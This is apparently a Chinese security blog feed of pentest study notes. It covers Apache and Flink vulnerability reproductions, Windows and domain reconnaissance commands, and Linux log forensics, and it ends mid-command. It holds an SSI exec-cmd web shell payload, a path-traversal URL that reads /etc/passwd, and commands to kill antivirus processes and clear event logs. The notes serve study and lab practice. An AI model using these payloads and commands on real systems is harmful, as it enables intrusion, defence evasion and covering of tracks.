class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> top10 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache 漏洞</title>
      <link href="2020/07/01/apache-lou-dong/"/>
      <url>2020/07/01/apache-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache漏洞"><a href="#Apache漏洞" class="headerlink" title="Apache漏洞"></a>Apache漏洞</h1><span id="more"></span><h2 id="1-1-Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#1-1-Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="1.1 Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>1.1 Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h2><h3 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1)漏洞原理"></a>1)漏洞原理</h3><p>此漏洞的出现是由于 apache 在修复第一个后缀名解析漏洞时，用正则来匹配后缀。在解析 php 时 xxx.php\x0A 将被按照 php 后缀进行解析，导致绕过一些服务器的安全策略</p><h3 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2)漏洞复现"></a>2)漏洞复现</h3><p>上传正常php文件截图</p><img src="/2020/07/01/apache-lou-dong/img-1.png" class="slug"><p>修改方框处 ，增加 hex码 0a</p><img src="/2020/07/01/apache-lou-dong/img-2.png" class="slug"><p>文件上传成功，访问 <a href="http://172.16.97.2:8080/evil.php%0a">http://172.16.97.2:8080/evil.php%0a</a> 发现上传成功</p><img src="/2020/07/01/apache-lou-dong/img-3.png" class="slug"><h2 id="1-2Apache-HTTPD-多后缀解析漏洞"><a href="#1-2Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="1.2Apache HTTPD 多后缀解析漏洞"></a>1.2Apache HTTPD 多后缀解析漏洞</h2><h3 id="1）漏洞原理"><a href="#1）漏洞原理" class="headerlink" title="1）漏洞原理"></a>1）漏洞原理</h3><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：</p><pre class="line-numbers language-none"><code class="language-none">AddType text&#x2F;html .htmlAddLanguage zh-CN .cn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其给<code>.html</code>后缀增加了media-type，值为<code>text/html</code>；给<code>.cn</code>后缀增加了语言，值为<code>zh-CN</code>。此时，如果用户请求文件<code>index.cn.html</code>，他将返回一个中文的html页面。</p><p>以上就是Apache多后缀的特性。如果运维人员给<code>.php</code>后缀增加了处理器：</p><pre class="line-numbers language-none"><code class="language-none">AddHandler application&#x2F;x-httpd-php .php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞</p><h3 id="2）漏洞复现"><a href="#2）漏洞复现" class="headerlink" title="2）漏洞复现"></a>2）漏洞复现</h3><p>访问<code>http://your-ip/uploadfiles/apache.php.jpeg</code>即可发现，phpinfo被执行了，该文件被解析为php脚本。</p><p><code>http://your-ip/index.php</code>中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为<code>xxx.php.jpg</code>或<code>xxx.php.jpeg</code>的文件，利用Apache解析漏洞进行getshell</p><img src="/2020/07/01/apache-lou-dong/img-4.png" class="slug"><h2 id="1-3-Apache-SSI-远程命令执行漏洞"><a href="#1-3-Apache-SSI-远程命令执行漏洞" class="headerlink" title="1.3 Apache SSI 远程命令执行漏洞"></a>1.3 Apache SSI 远程命令执行漏洞</h2><h3 id="1-漏洞原理-1"><a href="#1-漏洞原理-1" class="headerlink" title="1)漏洞原理"></a>1)漏洞原理</h3><p>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<code>&lt;!--#exec cmd=&quot;id&quot; --&gt;</code>语法执行任意命令。</p><h3 id="2）漏洞复现-1"><a href="#2）漏洞复现-1" class="headerlink" title="2）漏洞复现"></a>2）漏洞复现</h3><p>正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件：</p><pre class="line-numbers language-shtml" data-language="shtml"><code class="language-shtml">&lt;!--#exec cmd&#x3D;&quot;ls&quot; --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2020/07/01/apache-lou-dong/img-5.png" class="slug"><p>访问当前路径即可rce</p><img src="/2020/07/01/apache-lou-dong/img-6.png" class="slug"><h2 id="1-4-Apache-Flink上传路径遍历（CVE-2020-17518）"><a href="#1-4-Apache-Flink上传路径遍历（CVE-2020-17518）" class="headerlink" title="1.4 Apache Flink上传路径遍历（CVE-2020-17518）"></a>1.4 Apache Flink上传路径遍历（CVE-2020-17518）</h2><h3 id="1）漏洞原理-1"><a href="#1）漏洞原理-1" class="headerlink" title="1）漏洞原理"></a>1）漏洞原理</h3><p>Apache Flink是具有强大的流和批处理功能的开源流处理框架。</p><p>Apache Flink 1.5.1引入了REST处理程序，该处理程序允许您通过恶意修改的HTTP HEADER将上传的文件写入本地文件系统上的任意位置。</p><h3 id="2）漏洞复现-2"><a href="#2）漏洞复现-2" class="headerlink" title="2）漏洞复现"></a>2）漏洞复现</h3><p>搭建完成</p><img src="/2020/07/01/apache-lou-dong/img-7.png" class="slug"><p>访问submit New JOB 并且上传文件，在文件名处进行路径穿透</p><img src="/2020/07/01/apache-lou-dong/img-8.png" class="slug"><p>上传成功</p><img src="/2020/07/01/apache-lou-dong/img-9.png" class="slug"><h2 id="1-5-Apache-Flinkjobmanager-logs路径遍历（CVE-2020-17519）"><a href="#1-5-Apache-Flinkjobmanager-logs路径遍历（CVE-2020-17519）" class="headerlink" title="1.5 Apache Flinkjobmanager/logs路径遍历（CVE-2020-17519）"></a>1.5 Apache Flink<code>jobmanager/logs</code>路径遍历（CVE-2020-17519）</h2><h3 id="1-漏洞原理-2"><a href="#1-漏洞原理-2" class="headerlink" title="1) 漏洞原理"></a>1) 漏洞原理</h3><p>Apache Flink是具有强大的流和批处理功能的开源流处理框架。</p><p>Apache Flink 1.11.0中引入的一项更改（以及1.11.1和1.11.2中也发布）允许攻击者通过JobManager进程的REST接口读取JobManager本地文件系统上的任何文件。</p><p>参考：</p><ul><li><a href="https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801">https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-17519">https://nvd.nist.gov/vuln/detail/CVE-2020-17519</a></li></ul><h3 id="2）漏洞复现-3"><a href="#2）漏洞复现-3" class="headerlink" title="2）漏洞复现"></a>2）漏洞复现</h3><p>访问当前路径</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">http://172.16.97.2:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2020/07/01/apache-lou-dong/img-10.png" class="slug"><h4 id=""><a href="#" class="headerlink" title=""></a></h4>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网信息收集</title>
      <link href="2020/07/01/nei-wang-xin-xi-shou-ji/"/>
      <url>2020/07/01/nei-wang-xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><span id="more"></span><h2 id="1-WMIC-基础语法"><a href="#1-WMIC-基础语法" class="headerlink" title="1.WMIC 基础语法"></a>1.WMIC 基础语法</h2><h3 id="1-1-语法介绍"><a href="#1-1-语法介绍" class="headerlink" title="1.1 语法介绍"></a>1.1 语法介绍</h3><p>wmic命令行是用来管理WMI系统的， 算是win的插件 ， 用户可以使用 WMI 管理本地和远程计算机。</p><p>WMI在渗透测试中不需要下载和安装，是Windows系统自带功能，和cmd一样用</p><p>在整个运行过程都在计算机内存中发生，不会留下任何操作痕迹。</p><h3 id="1-2-简单实用"><a href="#1-2-简单实用" class="headerlink" title="1.2 简单实用"></a>1.2 简单实用</h3><h4 id="1-2-1-查看帮助"><a href="#1-2-1-查看帮助" class="headerlink" title="1.2.1 查看帮助"></a>1.2.1 查看帮助</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">wmic &#x2F;?  #查看全局命令process &#x2F;? #进程管理帮助wmic process get &#x2F;?   #属性获取操作帮助<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="1-2-2-常用命令"><a href="#1-2-2-常用命令" class="headerlink" title="1.2.2 常用命令"></a>1.2.2 常用命令</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#获取系统正在运行的进程、进程文件的路径、进程IDwmic process get caption,executablepath,processid#获取系统当前正在运行的服务wmic service where (state&#x3D;&#39;runing&#39;) get name,processid,pathname,startmode,caption#查看服务信息wmic service list brief#获取杀软详情wmic &#x2F;Node:localhost &#x2F;namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe &#x2F;Format:List#获取补丁信息wmic qfe get Caption,Description,HotFixID,InstalledOn#判断是否是虚拟机wmic onboarddevice get Description,DeviceType,Enabled,Status &#x2F;format:list#安装了那些软件wmic product get name,version#获取本地安装程序wmic &#x2F;NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_Product get name &#x2F;FORMAT:table#系统环境变量wmic environment get Description,VariableValue#计算机品牌，型号、名称、名字wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles &#x2F;format:list#获取系统驱动情况wmic sysdriver get Caption,Name,PathName,ServiceType,State,Status &#x2F;format:list#查看驱动器wmic logicaldisk get caption,description,providername  #查看当前操作系统wmic OS get Caption,CSDVersion,OSArchitecture,Version#查看开机自启动wmic startup get caption,command#查看共享文件wmic share get name,path,status<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-2-3-操作用户"><a href="#1-2-3-操作用户" class="headerlink" title="1.2.3 操作用户"></a>1.2.3 操作用户</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#搜索用户账户wmic useraccount list brief#锁定用户账号wmic useraccount where name&#x3D;&#39;hacker&#39; set disabled&#x3D;false#用户账号重命名wmic useraccount where name&#x3D;&#39;hacker&#39; rename hacker#限制用户修改密码wmic useraccount where name&#x3D;&#39;hacker&#39; set passwordchangeable&#x3D;false#搜索登录用户wmic logon list brief#搜索计算机域控制器wmic ntdomain list brief<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-2-4-操作服务"><a href="#1-2-4-操作服务" class="headerlink" title="1.2.4 操作服务"></a>1.2.4 操作服务</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#卸载和重装程序wmic product where &quot;name like &#39;%forit%&#39;&quot; get name#停止运行服务,主要是关闭杀软Wmic process where name&#x3D;&quot;XXX.exe&quot; call terminatewmic process where name&#x3D;&quot;explorer.exe&quot; call terminate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-2-5-清理日志"><a href="#1-2-5-清理日志" class="headerlink" title="1.2.5 清理日志"></a>1.2.5 清理日志</h4><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">wmic nteventlog where filename&#x3D;&#39;system&#39; cleareventlog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-本机信息"><a href="#2-本机信息" class="headerlink" title="2.  本机信息"></a>2.  本机信息</h2><h3 id="2-1-介绍"><a href="#2-1-介绍" class="headerlink" title="2.1 介绍"></a>2.1 介绍</h3><p>当主机上线时候，第一件事就是搜集有用信息，判断这是什么系统、找杀软、找漏洞来提权、判断内网等等。</p><p>而不是无头苍蝇，上来就乱搞一通。</p><h3 id="2-2-命令"><a href="#2-2-命令" class="headerlink" title="2.2 命令"></a>2.2 命令</h3><h4 id="2-2-1-系统与配置信息"><a href="#2-2-1-系统与配置信息" class="headerlink" title="2.2.1 系统与配置信息"></a>2.2.1 系统与配置信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#主机信息hostname #查看当前操作系统，重点查看版本、位数、补丁信息systeminfo systeminfo | findstr &#x2F;B &#x2F;C:&quot;Os Name&quot; &#x2F;C:&quot;OS Version&quot;#查看系统架构echo %PROCESSOR_ARCHITECTURE%#查看驱动情况DRIVERQUERY#查看磁盘驱动器，有几个磁盘wmic logicaldisk get caption,description,providername#host 信息type C:\\windows\system32\drivers\etc\hosts#如果安装iis服务器可以查看iis配置信息type C:\\windows\system32\inetsrv\config\applicationHost.config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2-2-软件与进程信息"><a href="#2-2-2-软件与进程信息" class="headerlink" title="2.2.2 软件与进程信息"></a>2.2.2 软件与进程信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#主要是看安装软件和版本信息，查响应版本漏洞wmic product get name,version#查看当前进程列表和进程用户，分析软件、邮件客户端、VPN和杀软等tasklist &#x2F;svcwmic process list brief#查看AV安装情况wmic &#x2F;Node:localhost &#x2F;Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName &#x2F;Format:List#已启动程序的信息，查看开机自启动wmic startup get command,caption<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2-3-服务信息"><a href="#2-2-3-服务信息" class="headerlink" title="2.2.3 服务信息"></a>2.2.3 服务信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#查看启动的服务net start#查看服务信息q#查询服务的详细信息sc querys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2-4-计划任务"><a href="#2-2-4-计划任务" class="headerlink" title="2.2.4 计划任务"></a>2.2.4 计划任务</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">schtasks #计划任务参考参数&#x2F;Create  # 创建计划任务&#x2F;Delete  #删除计划任务&#x2F;Query #显示所有的计划任务&#x2F;Change  #更改计划任务&#x2F;Run。# 运行计划任务&#x2F;End。#终止当前计划任务&#x2F;ShowSid  #显示与计划任务名称相应的安全标识符&#x2F;？  #显示此帮助消息#查询所有的计划任务schtasks &#x2F;query &#x2F;fo list &#x2F;v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2-5-用户信息"><a href="#2-2-5-用户信息" class="headerlink" title="2.2.5 用户信息"></a>2.2.5 用户信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#查看主机开机时间net statistics workstation#查询已经在线用户，注意管理员是否在线query user || qwinstaquery session #查看当前用户权限，主要是判断现在是本地平台用户、本地管理员、还是域内用户whoamiwhoami &#x2F;all# 查看本地用户列表，推测命名规则net user#查看所有组名，net localgroup#然后可以查看指定组中的成员列表，比如查询本地管理员组看到本地一个管理员，还一个域的Domainadmins为域内机器的本地管理员用户net localgroup administrators<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2-6-网络配置信息"><a href="#2-2-6-网络配置信息" class="headerlink" title="2.2.6 网络配置信息"></a>2.2.6 网络配置信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#查看网络信息ipconfig &#x2F;all#查看路由器和路由表，可以判断内网的地址段route printarp -A#查看主机共享列表，可访问的共享列表net sharewmic share get name,path,status#查看主机开放端口以及链接状态，TCP&#x2F;UDPnetstat -anonetstat -anob #查看对应的程序，需要权限#通过注册表查看代理情况REG QUERY &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3域信息收集"><a href="#3域信息收集" class="headerlink" title="3域信息收集"></a>3域信息收集</h2><h3 id="3-1-域内信息收集"><a href="#3-1-域内信息收集" class="headerlink" title="3.1 域内信息收集"></a>3.1 域内信息收集</h3><h4 id="3-1-1主机信息收集"><a href="#3-1-1主机信息收集" class="headerlink" title="3.1.1主机信息收集"></a>3.1.1主机信息收集</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">shell systeminfo #查看主机信息，存在域信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2020/07/01/nei-wang-xin-xi-shou-ji/img-1.png" class="slug"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#获取域名ipshell nslookup god.orgping god.org #查询当前会话登陆的是域还是本地工作组，是域的话可以查DNS和域用户信息shell config workstation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2020/07/01/nei-wang-xin-xi-shou-ji/img-2.png" class="slug"><h4 id="3-1-2域基本信息查询"><a href="#3-1-2域基本信息查询" class="headerlink" title="3.1.2域基本信息查询"></a>3.1.2域基本信息查询</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">shell net view #查看工作组内主机shell net view&#x2F;domain #查看有几个域shell net view&#x2F;domain：god.org  #查看指定域内主机shell net accounts &#x2F;domain   #获取域密码策略shell nltest &#x2F;domain_trusts #获取域信任信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-1-3-域内用户和管理员信息"><a href="#3-1-3-域内用户和管理员信息" class="headerlink" title="3.1.3.域内用户和管理员信息"></a>3.1.3.域内用户和管理员信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net user &#x2F;domain #查询域内用户列表net user Administrator &#x2F;domamin # 查询指定域用户信息net group &#x2F;doamin  #查看域内的组，判断每个组的功能net group &quot;domain admins&quot; &#x2F;domain #查询域管理员组内的用户net group &quot;Domain computers&quot; &#x2F;domain  #查询域成员计算机列表，对应的是主机的机器账户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-1-4判断主域（域控）"><a href="#3-1-4判断主域（域控）" class="headerlink" title="3.1.4判断主域（域控）"></a>3.1.4判断主域（域控）</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net time &#x2F;domain #域服务器一般会作为时间服务器使用，就可以获得域控地址存在域，但当前用户不是域用户会拒绝访问；是域用户就获得相应地址；显示找不到域则是工作组环境ping DC.domain.test #通过ping获取域控nltest &#x2F;DCLIST:domainnetdom query pdcnet group &quot;Domain controllers&quot; &#x2F;domain # 查看域控制器的机器账户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 内网 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 基础</title>
      <link href="2020/06/10/linux-ji-chu/"/>
      <url>2020/06/10/linux-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-学习笔记"><a href="#Linux-学习笔记" class="headerlink" title="Linux 学习笔记"></a>Linux 学习笔记</h1><span id="more"></span><h2 id="1-根目录解析"><a href="#1-根目录解析" class="headerlink" title="1 根目录解析"></a>1 根目录解析</h2><ul><li><p>/ 根目录</p><p>每个文件和目录都是从这里开始，只有root用户具有该目录下的写权限，此目录不同于/root，/root目录是root用户的主目录</p></li><li><p>/bin 用户二进制文件</p><p>包含二进制可执行文件，系统所有的用户使用的命令都设置在这里，如ps，ls，ping</p></li><li><p>/sbin。系统二进制文件</p><p>就像/bin，/sbin同样包含二进制可执行文件。但是这个目录下的linux命令通常由系统管理员使用，对系统进行维护，如：iptables，reboot，fdisk。ifconfig</p></li><li><p>/etc 配置文件</p><p>包含所有程序所需的配置文件，也包含了用于启动/停止单个程序的启动和关闭的shell脚本，如：/etc/resolv.conf</p></li><li><p>/dev 设置文件</p><p>这些包括终端设备，USB或链接到系统的任何设备</p></li><li><p>/proc 进程信息</p><p>这个是一个虚拟的文件系统，包含有关正在运行的进程信息，如：/proc/「pid」包含与特定pid的相关信息</p></li><li><p>/var 变量文件</p><p>这个目录下可以找到内容可能增长的文件，如系统日志文件/var/log ，数据库文件/var/lib打印队列/var/spool</p></li><li><p>/tmp 临时文件</p><p>包含系统和用户创建的临时文件，当系统重新启动时，这个目录下的文件都将被删除</p></li><li><p>/usr 用户程序</p><ul><li><p>包含二进制文件、库文件、文档和二级程序的源代码。</p><p>/usr/bin中包含用户程序的二进制文件。如果你在/bin中找不到用户二进制文件，到/usr/bin目录看看。例如：at、awk、cc、less、scp。</p><p>/usr/sbin中包含系统管理员的二进制文件。如果你在/sbin中找不到系统二进制文件，到/usr/sbin目录看看。例如：atd、cron、sshd、useradd、userdel。</p><p>/usr/lib中包含了/usr/bin和/usr/sbin用到的库。</p><p>/usr/local中包含了从源安装的用户程序。例如，当你从源安装Apache，它会在/usr/local/apache2中。</p></li></ul></li><li><p>/home - HOME目录</p><p>所有用户用home目录来存储他们的个人档案。</p></li><li><p>/boot - 引导加载程序文件</p></li></ul><p>包含引导加载程序相关的文件，内核的initrd、vmlinux、grub文件位于/boot下。</p><ul><li><p>/lib - 系统库</p><p>包含支持位于/bin和/sbin下的二进制文件的库文件。</p></li><li><p>/opt - 可选的附加应用程序</p><p>opt代表opitional，包含从个别厂商的附加应用程序，附加应用程序应该安装在/opt/或者/opt/的子目录下。</p></li><li><p>/mnt - 挂载目录</p><p>临时安装目录，系统管理员可以挂载文件系统。</p></li><li><p>/media - 可移动媒体设备</p><p>用于挂载可移动设备的临时目录。举例来说，挂载CD-ROM的/media/cdrom，挂载软盘驱动器</p><p>的/media/floppy</p></li><li><p>/srv - 服务数据</p><p>包含服务器特定服务相关的数据。</p></li></ul><h2 id="2-日志文件"><a href="#2-日志文件" class="headerlink" title="2 日志文件"></a>2 日志文件</h2><table><thead><tr><th>日志文件</th><th>说 明</th></tr></thead><tbody><tr><td>/var/log/cron</td><td>记录与系统定时任务相关的曰志</td></tr><tr><td>/var/log/cups/</td><td>记录打印信息的曰志</td></tr><tr><td>/var/log/dmesg</td><td>记录了系统在开机时内核自检的信总。也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td>/var/log/btmp</td><td>记录错误登陆的日志。这个文件是二进制文件，不能直接用Vi查看，而要使用lastb命令查看。命令如下： [root@localhost log]#lastb root tty1 Tue Jun 4 22:38 - 22:38 (00:00) #有人在6月4 日 22:38便用root用户在本地终端 1 登陆错误</td></tr><tr><td>/var/log/lasllog</td><td>记录系统中所有用户最后一次的登录时间的曰志。这个文件也是二进制文件.不能直接用Vi 查看。而要使用lastlog命令查看</td></tr><tr><td>/var/Iog/mailog</td><td>记录邮件信息的曰志</td></tr><tr><td>/var/log/messages</td><td>它是核心系统日志文件，其中包含了系统启动时的引导信息，以及系统运行时的其他状态消息。I/O 错误、网络错误和其他系统错误都会记录到此文件中。其他信息，比如某个人的身份切换为 root，已经用户自定义安装软件的日志，也会在这里列出。</td></tr><tr><td>/var/log/secure</td><td>记录验证和授权方面的倍息，只要涉及账户和密码的程序都会记录，比如系统的登录、ssh的登录、su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr><tr><td>/var/log/wtmp</td><td>永久记录所有用户的登陆、注销信息，同时记录系统的后动、重启、关机事件。同样，这个文件也是二进制文件.不能直接用Vi查看，而要使用last命令查看</td></tr><tr><td>/var/tun/ulmp</td><td>记录当前已经登录的用户的信息。这个文件会随着用户的登录和注销而不断变化，只记录当前登录用户的信息。同样，这个文件不能直接用Vi查看，而要使用w、who、users等命令查看</td></tr></tbody></table><h2 id="3-基础查看信息杂项"><a href="#3-基础查看信息杂项" class="headerlink" title="3 基础查看信息杂项"></a>3 基础查看信息杂项</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#查看cup占用前十的进程ps auxw|head -1;ps auxw|sort -rn -k3|head -10#查看除root外，是否还有其他特权用户 uid&#x3D;0awk -F:&#39;$3&#x3D;&#x3D;0&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwdroot:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash#查看可以远程登录的账号信息awk &#39;&#x2F;$1|$6&#x2F;&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow#查看登录失败信息grep -o &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|uniq -ccat &#x2F;var&#x2F;log&#x2F;secure | grep &quot;Failed password&quot;| awk &#39;&#123;print $13&#125;&#39;#输出登录爆破的第一行和最后一行，确认爆破时间范围grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|head -1grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|tail -1#查看爆破的IPgrep &quot;Failed password for root&quot; &#x2F;var&#x2F;log&#x2F;auth.log | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more#sort可针对文本文件的内容，以行为单位来排序#Linux uniq 命令用于检查及删除文本文件中重复出现的行列，一般与 sort 命令结合使用#爆破用户名字典都有哪些？grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|perl -e &#39;while($_&#x3D;&lt;&gt;)&#123; &#x2F;for(.*?) from&#x2F;; print &quot;$1\n&quot;;&#125;&#39;|uniq -c|sort -nr#登录成功的日期、用户名、IPgrep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="lastlog列出所有用户最近登录的信息"><a href="#lastlog列出所有用户最近登录的信息" class="headerlink" title="lastlog列出所有用户最近登录的信息"></a><code>lastlog</code>列出所有用户最近登录的信息</h4><pre class="line-numbers language-none"><code class="language-none">lastlog&#96;引用的是&#96;&#x2F;var&#x2F;log&#x2F;lastlog&#96;文件中的信息，包括&#96;login-name&#96;、&#96;port&#96;、&#96;last login time<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="last-列出当前和曾经登入系统的用户信息"><a href="#last-列出当前和曾经登入系统的用户信息" class="headerlink" title="last 列出当前和曾经登入系统的用户信息"></a><code>last</code> 列出当前和曾经登入系统的用户信息</h4><p>它默认读取的是<code>/var/log/wtmp</code>文件的信息。输出的内容包括：用户名、终端位置、登录源信息、开始时间、结束时间、持续时间。注意最后一行输出的是<code>wtmp</code>文件起始记录的时间。当然也可以通过<code>last -f</code>参数指定读取文件，可以是<code>/var/log/btmp</code>、<code>/var/run/utmp</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">语法：last [-R] [-num] [ -n num ] [-adiowx] [ -f file ] [ -t YYYYMMDDHHMMSS ] [name...]  [tty...]例子：last -x ：显示系统关闭、用户登录和退出的历史last -i：显示特定ip登录的情况last -t  20181010120101： 显示20181010120101之前的登录信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="lastb-列出失败尝试的登录信息"><a href="#lastb-列出失败尝试的登录信息" class="headerlink" title="lastb 列出失败尝试的登录信息"></a><code>lastb</code> 列出失败尝试的登录信息</h4><p>和<code>last</code>命令功能完全相同，只不过它默认读取的是<code>/var/log/btmp</code>文件的信息。当然也可以通过<code>last -f</code>参数指定读取文件，可以是<code>/var/log/btmp</code>、<code>/var/run/utmp</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#统计一下登录成功的IP有哪些grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more#除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限more &#x2F;etc&#x2F;sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL&#x3D;(ALL)&quot;#禁用或删除多余及可疑的帐号usermod -L user    #禁用帐号，帐号无法登录，&#x2F;etc&#x2F;shadow第二栏为!开头userdel user       #删除user用户userdel -r user    #将删除user用户，并且将&#x2F;home目录下的user目录一并删除#增加一个用户kali日志grep &quot;useradd&quot; &#x2F;var&#x2F;log&#x2F;secure#删除用户kali日志#查看谁有sudo授权执行权限(权限级别)sudo -lgrep &quot;userdel&quot; &#x2F;var&#x2F;log&#x2F;secure#sudo 授权执行#查看谁有sudo授权执行权限(权限级别)sudo -l#使用ps命令，分析进程ps aux | grep 